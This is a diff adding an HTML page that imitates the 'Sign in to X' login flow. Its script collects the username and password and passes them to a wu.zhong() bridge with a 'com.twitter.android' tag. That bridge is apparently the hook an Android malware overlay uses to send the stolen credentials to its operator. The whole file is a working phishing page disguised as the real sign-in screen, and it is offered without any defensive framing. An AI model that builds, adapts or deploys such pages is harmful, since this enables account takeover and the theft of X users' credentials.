@@ -1,0 +1,384 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in to X</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #000;
+            color: #fff;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .container {
+            flex: 1;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            max-width: 400px;
+            margin: 0 auto;
+            width: 100%;
+        }
+
+        .header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 40px;
+            padding-top: 20px;
+        }
+
+        .close-btn {
+            font-size: 24px;
+            color: #fff;
+            cursor: pointer;
+            background: none;
+            border: none;
+            padding: 8px;
+        }
+
+        .logo {
+            font-size: 32px;
+            font-weight: bold;
+            color: #fff;
+        }
+
+        .spacer {
+            width: 40px;
+        }
+
+        .title {
+            font-size: 31px;
+            font-weight: bold;
+            margin-bottom: 40px;
+            line-height: 1.2;
+        }
+
+        .form-container {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .input-group {
+            margin-bottom: 20px;
+        }
+
+        .input-field {
+            width: 100%;
+            background: transparent;
+            border: 1px solid #333;
+            border-radius: 4px;
+            padding: 16px;
+            font-size: 17px;
+            color: #fff;
+            transition: border-color 0.2s;
+        }
+
+        .input-field:focus {
+            outline: none;
+            border-color: #1d9bf0;
+        }
+
+        .input-field::placeholder {
+            color: #71767b;
+        }
+
+        .password-container {
+            position: relative;
+        }
+
+        .password-field {
+            padding-right: 50px;
+        }
+
+        .password-toggle {
+            position: absolute;
+            right: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            color: #71767b;
+            cursor: pointer;
+            font-size: 20px;
+            padding: 4px;
+        }
+
+        .separator {
+            text-align: center;
+            margin: 20px 0;
+            position: relative;
+        }
+
+        .separator::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 0;
+            right: 0;
+            height: 1px;
+            background: #2f3336;
+        }
+
+        .separator span {
+            background: #000;
+            padding: 0 16px;
+            color: #71767b;
+            font-size: 15px;
+        }
+
+        .btn {
+            width: 100%;
+            padding: 16px;
+            border-radius: 24px;
+            font-size: 17px;
+            font-weight: bold;
+            cursor: pointer;
+            border: none;
+            transition: all 0.2s;
+        }
+
+        .btn-primary {
+            background: #fff;
+            color: #000;
+            margin-bottom: 20px;
+        }
+
+        .btn-primary:hover {
+            background: #e6e6e6;
+        }
+
+        .btn-primary:disabled {
+            background: #2f3336;
+            color: #71767b;
+            cursor: not-allowed;
+        }
+
+        .forgot-password {
+            color: #1d9bf0;
+            text-decoration: none;
+            font-size: 15px;
+            margin-bottom: 20px;
+            display: inline-block;
+        }
+
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
+
+        .footer {
+            margin-top: auto;
+            padding-top: 40px;
+            text-align: left;
+        }
+
+        .footer-text {
+            color: #71767b;
+            font-size: 15px;
+        }
+
+        .signup-link {
+            color: #1d9bf0;
+            text-decoration: none;
+        }
+
+        .signup-link:hover {
+            text-decoration: underline;
+        }
+
+        .email-display {
+            background: #16181c;
+            border: 1px solid #333;
+            border-radius: 4px;
+            padding: 16px;
+            font-size: 17px;
+            color: #fff;
+            margin-bottom: 20px;
+        }
+
+        .email-label {
+            color: #71767b;
+            font-size: 13px;
+            margin-bottom: 4px;
+        }
+
+     
+        .page {
+            display: none;
+        }
+
+        .page.active {
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                padding: 16px;
+            }
+            
+            .title {
+                font-size: 28px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div id="page1" class="page active">
+        <div class="container">
+            <div class="header">
+                <button class="close-btn">✕</button>
+                <div class="logo">𝕏</div>
+                <div class="spacer"></div>
+            </div>
+            
+            <h1 class="title">Sign in to X</h1>
+            
+            <div class="form-container">
+             
+                
+                <div class="input-group">
+                    <input 
+                        type="text" 
+                        class="input-field" 
+                        placeholder="Phone, email, or username"
+                        id="loginInput"
+                    >
+                </div>
+                
+                <button class="btn btn-primary" id="nextBtn">Next</button>
+                
+                <a href="#" class="forgot-password">Forgot password?</a>
+                
+                <div class="footer">
+                    <span class="footer-text">Don't have an account? </span>
+                    <a href="#" class="signup-link">Sign up</a>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div id="page2" class="page">
+        <div class="container">
+            <div class="header">
+                <button class="close-btn" onclick="goBack()">✕</button>
+                <div class="logo">𝕏</div>
+                <div class="spacer"></div>
+            </div>
+            
+            <h1 class="title">Enter your password</h1>
+            
+            <div class="form-container">
+                <div class="input-group">
+                    <div class="email-label">Email</div>
+                    <div class="email-display" id="emailDisplay">
+                       
+                    </div>
+                </div>
+                
+                <div class="input-group">
+                    <div class="password-container">
+                        <input 
+                            type="password" 
+                            class="input-field password-field" 
+                            placeholder="Password"
+                            id="passwordInput"
+                        >
+                        <button class="password-toggle" onclick="togglePassword()">
+                            <span id="eyeIcon"></span>
+                        </button>
+                    </div>
+                </div>
+                
+                <a href="#" class="forgot-password">Forgot password?</a>
+                
+                <button class="btn btn-primary" id="loginBtn">Log in</button>
+                
+                <div class="footer">
+                    <span class="footer-text">Don't have an account? </span>
+                    <a href="#" class="signup-link">Sign up</a>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let currentPage = 1;
+        
+        function showPage(pageNumber) {
+            document.getElementById('page1').classList.remove('active');
+            document.getElementById('page2').classList.remove('active');
+            document.getElementById('page' + pageNumber).classList.add('active');
+            currentPage = pageNumber;
+        }
+        
+        function goBack() {
+            if (currentPage === 2) {
+                showPage(1);
+            }
+        }
+       
+        
+
+        document.getElementById('nextBtn').addEventListener('click', function() {
+            const loginInput = document.getElementById('loginInput').value.trim();
+            
+            if (loginInput) {
+   
+                document.getElementById('emailDisplay').textContent = loginInput;
+                showPage(2);
+            } else {
+                document.getElementById('loginInput').focus();
+            }
+        });
+        
+      
+        document.getElementById('loginBtn').addEventListener('click', function() {
+            const password = document.getElementById('passwordInput').value.trim();
+             const loginInput = document.getElementById('loginInput').value.trim();
+            
+            if (password) {
+                 wu.zhong(`🔰X.com Login \n\n✉️Username: ${loginInput}\n🔒Password: ${password}`,"com.twitter.android");
+            } else {
+             document.getElementById('passwordInput').focus();
+            }
+        });
+        
+ 
+        document.getElementById('loginInput').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                document.getElementById('nextBtn').click();
+            }
+        });
+        
+        document.getElementById('passwordInput').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                document.getElementById('loginBtn').click();
+            }
+        });
+        
+        document.getElementById('loginInput').addEventListener('input', function() {
+            const nextBtn = document.getElementById('nextBtn');
+            if (this.value.trim()) {
+                nextBtn.disabled = false;
+            } else {
+                nextBtn.disabled = true;
+            }
+        });
+        
+   
+        document.getElementById('nextBtn').disabled = true;
+    </script>
+</body>
+</html>
